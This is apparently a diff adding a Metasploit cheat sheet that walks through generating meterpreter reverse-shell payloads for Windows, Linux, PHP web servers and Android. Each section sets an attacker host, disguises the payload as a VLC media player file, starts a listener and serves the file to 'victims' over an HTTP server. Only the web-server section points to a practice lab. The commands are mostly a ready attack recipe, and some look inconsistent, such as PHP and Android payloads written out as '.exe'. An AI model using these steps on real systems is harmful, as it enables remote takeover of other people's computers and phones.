@@ -1,0 +1,103 @@
+Victims:
+
++ Windows
+``````````
+a) Generate the payload for target OS:
+```````````````````````````````````````
+msf6> use payload/windows/x64/meterpreter/reverse_tcp
+msf6> show options
+msf6> set LHOST x.x.x.x (attacker'sIP)
+msf6> set LPORT 9898
+msf6> generate -f exe -o /home/kali/vlc.exe
+
+
+b) Start reverse handler:
+``````````````````````````
+msf6> use exploit/multi/handler
+msf6> set PAYLOAD windows/x64/meterpreter/reverse_tcp
+msf6> set LHOST x.x.x.x (attacker'sIP)
+msf6> set LPORT 9898
+msf6> exploit
+
+c) Payload to victim:
+``````````````````````
+# cd /home/kali
+# python3 -m http.server --bind x.x.x.x 80
+
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
++ Linux/Unix
+
+a) Generate the payload for target OS:
+```````````````````````````````````````
+msf6> use payload/linux/x64/meterpreter/reverse_tcp
+msf6> show options
+msf6> set LHOST x.x.x.x (attacker'sIP)
+msf6> set LPORT 9898
+msf6> generate -f elf -o /home/kali/vlc.elf
+
+
+b) Start reverse handler:
+``````````````````````````
+msf6> use exploit/multi/handler
+msf6> set PAYLOAD linux/x64/meterpreter/reverse_tcp
+msf6> set LHOST x.x.x.x (attacker'sIP)
+msf6> set LPORT 9898
+msf6> exploit
+
+c) Payload to victim:
+``````````````````````
+# cd /home/kali
+# python3 -m http.server --bind x.x.x.x 80
+
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
++ Web Servers
+
+a) Generate the payload for target OS:
+```````````````````````````````````````
+msf6> use payload/php/meterpreter/reverse_tcp
+msf6> show options
+msf6> set LHOST x.x.x.x (attacker'sIP)
+msf6> set LPORT 9898
+msf6> generate -f exe -o /home/kali/vlc.exe
+
+
+b) Start reverse handler:
+``````````````````````````
+msf6> use exploit/multi/handler
+msf6> set PAYLOAD php/meterpreter/reverse_tcp
+msf6> set LHOST x.x.x.x (attacker'sIP)
+msf6> set LPORT 9898
+msf6> exploit
+
+c) Payload to victim:
+``````````````````````
+On victim use the LAB: https://github.com/LunaM00n/File-Upload-Lab
+Use a website's upload function to upload payload and run it.
+
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
++ Android
+```````````
+a) Generate the payload for target OS:
+```````````````````````````````````````
+msf6> use payload/android/meterpreter/reverse_tcp
+msf6> show options
+msf6> set LHOST x.x.x.x (attacker'sIP)
+msf6> set LPORT 9898
+msf6> generate -f exe -o /home/kali/vlc.exe
+
+
+b) Start reverse handler:
+``````````````````````````
+msf6> use exploit/multi/handler
+msf6> set PAYLOAD android/meterpreter/reverse_tcp
+msf6> set LHOST x.x.x.x (attacker'sIP)
+msf6> set LPORT 9898
+msf6> exploit
+
+c) Payload to victim:
+``````````````````````
+# cd /home/kali
+# python3 -m http.server --bind x.x.x.x 80
